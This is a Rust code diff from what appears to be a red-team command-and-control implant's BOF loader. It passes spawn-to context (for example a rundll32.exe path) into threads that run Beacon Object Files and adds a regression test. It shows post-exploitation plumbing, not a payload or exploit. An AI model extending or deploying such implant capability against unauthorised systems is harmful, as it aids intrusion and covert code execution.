@@ -95,6 +95,7 @@ std::thread_local! {
 /// Configuration context made available to Beacon API callbacks during BOF
 /// execution.  Set via [`set_bof_context`] before calling [`coffee_execute`]
 /// and cleared via [`clear_bof_context`] afterward.
+#[derive(Clone)]
 pub struct BofContext {
     /// 64-bit spawn-to path as UTF-16LE (including NUL terminator).
     pub spawn64: Option<Vec<u16>>,
@@ -1349,6 +1350,8 @@ struct BofThreadArgs {
     arg_data: Vec<u8>,
     output_queue: BofOutputQueue,
     request_id: u32,
+    /// Spawn/token context to install on the new thread before BOF execution.
+    spawn_ctx: BofContext,
 }
 
 /// Thread entry point for threaded BOF execution.
@@ -1362,7 +1365,11 @@ struct BofThreadArgs {
 unsafe extern "system" fn bof_thread_entry(param: *mut std::ffi::c_void) -> u32 {
     // SAFETY: param is a Box<BofThreadArgs> leaked in coffee_execute_threaded.
     let args = unsafe { Box::from_raw(param.cast::<BofThreadArgs>()) };
+    // Install spawn context on this thread so Beacon API callbacks
+    // (BeaconGetSpawnTo, BeaconSpawnTemporaryProcess) see the configured paths.
+    set_bof_context(&args.spawn_ctx);
     let result = coffee_execute(&args.function_name, &args.object_data, &args.arg_data, false);
+    clear_bof_context();
 
     // Stamp the originating request ID on every callback so the teamserver can
     // correlate threaded BOF results with the correct task.
@@ -1404,9 +1411,16 @@ pub fn coffee_execute_threaded(
     arg_data: Vec<u8>,
     output_queue: BofOutputQueue,
     request_id: u32,
+    spawn_ctx: BofContext,
 ) -> Option<isize> {
-    let args =
-        Box::new(BofThreadArgs { function_name, object_data, arg_data, output_queue, request_id });
+    let args = Box::new(BofThreadArgs {
+        function_name,
+        object_data,
+        arg_data,
+        output_queue,
+        request_id,
+        spawn_ctx,
+    });
     let param = Box::into_raw(args).cast::<std::ffi::c_void>();
 
     // SAFETY: param points to a valid Box<BofThreadArgs>; the thread
@@ -1442,6 +1456,7 @@ pub fn coffee_execute_threaded(
     _arg_data: Vec<u8>,
     _output_queue: BofOutputQueue,
     _request_id: u32,
+    _spawn_ctx: BofContext,
 ) -> Option<isize> {
     warn!("Threaded BOF execution is only supported on Windows");
     None
@@ -1495,8 +1510,50 @@ mod tests {
             vec![],
             new_bof_output_queue(),
             42,
+            BofContext { spawn64: None, spawn32: None },
         );
         assert!(result.is_none());
+    }
+
+    /// Regression test: spawn context carried into a new thread is visible to
+    /// Beacon API callbacks (`BeaconGetSpawnTo`) running on that thread.
+    ///
+    /// This exercises the exact pattern used by `bof_thread_entry` — the
+    /// context is installed on entry to the BOF thread, not on the dispatching
+    /// thread — verifying that threaded BOFs no longer see a null context.
+    #[test]
+    #[allow(unsafe_code)]
+    fn threaded_bof_spawn_context_visible_in_new_thread() {
+        let path64: Vec<u16> = "C:\\Windows\\System32\\rundll32.exe\0".encode_utf16().collect();
+        let ctx = BofContext { spawn64: Some(path64.clone()), spawn32: None };
+
+        // Confirm no context is set on the current thread before we begin.
+        clear_bof_context();
+
+        let handle = std::thread::spawn(move || {
+            // Simulate what bof_thread_entry does: install the context on this
+            // thread before executing any BOF callbacks.
+            set_bof_context(&ctx);
+
+            let mut buf = vec![0u8; 512];
+            // SAFETY: buf is valid and large enough for the path.
+            unsafe { beacon_get_spawn_to(0, buf.as_mut_ptr(), buf.len() as i32) };
+
+            clear_bof_context();
+
+            // Return the bytes so the parent thread can inspect them.
+            buf
+        });
+
+        let buf = handle.join().expect("thread panicked");
+
+        // Verify the UTF-16LE spawn path was returned correctly.
+        let byte_len = path64.len() * 2;
+        let copied: Vec<u16> =
+            (0..path64.len()).map(|i| u16::from_le_bytes([buf[i * 2], buf[i * 2 + 1]])).collect();
+        assert_eq!(copied, path64);
+        // Bytes beyond the path must be zero.
+        assert!(buf[byte_len..].iter().all(|&b| b == 0));
     }
 
     #[test]
